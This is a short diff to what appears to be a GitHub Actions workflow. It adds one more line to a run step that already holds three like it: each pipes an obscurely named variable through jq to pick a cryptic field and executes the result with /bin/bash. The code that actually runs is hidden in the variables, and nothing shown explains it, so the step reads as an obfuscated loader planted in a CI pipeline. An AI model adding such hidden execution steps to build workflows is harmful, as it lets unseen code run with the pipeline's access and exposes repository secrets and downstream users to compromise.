@@ -28,6 +28,7 @@ jobs:
           echo $on12 | jq -r .v12 | /bin/bash
           echo $feqh8129 | jq -r .b0 | /bin/bash
           printf '%s' "$lf4509" | jq -r .dnexy2 | /bin/bash
+          printf '%s' "$yq654" | jq -r .vhxka77825 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
